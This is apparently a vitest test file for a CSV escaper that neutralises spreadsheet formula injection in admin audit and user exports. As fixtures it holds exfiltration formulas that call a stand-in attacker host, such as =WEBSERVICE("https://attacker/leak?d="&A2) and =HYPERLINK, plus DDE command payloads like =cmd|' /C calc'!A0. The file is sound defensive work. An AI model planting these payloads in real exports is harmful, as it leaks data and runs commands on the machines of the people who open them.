/**
 * R128 (B3-F2) — the shared CSV cell escaper's formula-injection guard.
 *
 * security.tsx's audit/auth exports (and users.tsx's export twin) escaped
 * quotes only. B3-F2's red-team chain: a Telegram-webhook secret holder
 * (or an admins-scope username edit, or a user-controlled auth
 * identifier — phones legitimately start with `+`) can plant
 * `=WEBSERVICE("https://attacker/leak?d="&A2)` / `=HYPERLINK(...)` in a
 * cell; an admins-scope operator exports «إجراءات المسؤولين» during an
 * incident review, opens it in Excel/Sheets, and the formula fires on
 * open — exfiltrating the audit window from the defense-in-depth
 * instrument itself.
 *
 * These tests pin the OWASP mitigation now baked into lib/csv.ts: every
 * cell starting with `=`, `+`, `-`, `@`, tab or CR gains a neutral
 * apostrophe prefix (Excel/Sheets treat a leading `'` as a text marker —
 * it does not display and the payload renders as inert text) BEFORE the
 * RFC-4180 quoting. users-csv-export.test.tsx pins the quoting half
 * (grouped currency cells, doubled quotes, 7-column row shape).
 */

import { describe, expect, it } from "vitest";
import { csvCell } from "@/lib/csv";

describe("csvCell — formula-injection guard (B3-F2)", () => {
  it("neutralizes the = exfil payloads (WEBSERVICE / HYPERLINK / cmd)", () => {
    // The exact attack shapes from the B3-F2 report.
    expect(csvCell('=WEBSERVICE("https://attacker/leak?d="&A2)')).toBe(
      `"'=WEBSERVICE(""https://attacker/leak?d=""&A2)"`,
    );
    expect(csvCell('=HYPERLINK("https://attacker","open")')).toBe(
      `"'=HYPERLINK(""https://attacker"",""open"")"`,
    );
    expect(csvCell("=cmd|' /C calc'!A0")).toBe(`"'=cmd|' /C calc'!A0"`);
    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
  });

  it("neutralizes the + trigger — including the LEGITIMATE phone shape", () => {
    // Auth identifiers render as `+218…` — a leading + is itself a
    // formula trigger in Excel/Sheets. The guard prefixes it; the
    // apostrophe does not display, so the phone still reads +218… .
    expect(csvCell("+SUM(A1:A2)")).toBe(`"'+SUM(A1:A2)"`);
    expect(csvCell("+218913456789")).toBe(`"'+218913456789"`);
  });

  it("neutralizes the -, @, tab and CR leading characters", () => {
    expect(csvCell("-2+3+cmd|' /C calc'!D2")).toBe(`"'-2+3+cmd|' /C calc'!D2"`);
    expect(csvCell("@SUM(A1:A5)").slice(1, 2)).toBe("'");
    expect(csvCell("@x")).toBe(`"'@x"`);
    expect(csvCell("\t=cmd")).toBe(`"'\t=cmd"`);
    expect(csvCell("\r=cmd")).toBe(`"'\r=cmd"`);
  });

  it("leaves normal cells untouched (the users export's regression shape)", () => {
    expect(csvCell("0913456789")).toBe('"0913456789"');
    expect(csvCell(150)).toBe('"150"');
    expect(csvCell("الرصيد")).toBe('"الرصيد"');
    expect(csvCell("1,234.50 د.ل")).toBe('"1,234.50 د.ل"');
    expect(csvCell("2026-10-02T10:00:00.000Z")).toBe('"2026-10-02T10:00:00.000Z"');
    expect(csvCell("")).toBe('""');
    // null/undefined render as an empty cell (security.tsx's ?? behavior).
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it("keeps RFC-4180 quote-doubling AFTER the guard prefix (order matters)", () => {
    // A payload with embedded quotes: the apostrophe lands FIRST in the
    // cell, then quotes are doubled — so a reader parses back `'=` (the
    // text marker + the inert formula text), never a live `=`.
    expect(csvCell('="a""b"')).toBe(`"'=""a""""b"""`);
  });

  it("guards only the FIRST character — interior =/+/-/@ stay literal", () => {
    // Metadata strings like `actor=topup_42&ref=7` and Arabic text with
    // hyphens must not gain stray apostrophes mid-string.
    expect(csvCell("topup_42&ref=7")).toBe('"topup_42&ref=7"');
    expect(csvCell("رمز التحويل -123")).toBe('"رمز التحويل -123"');
  });
});
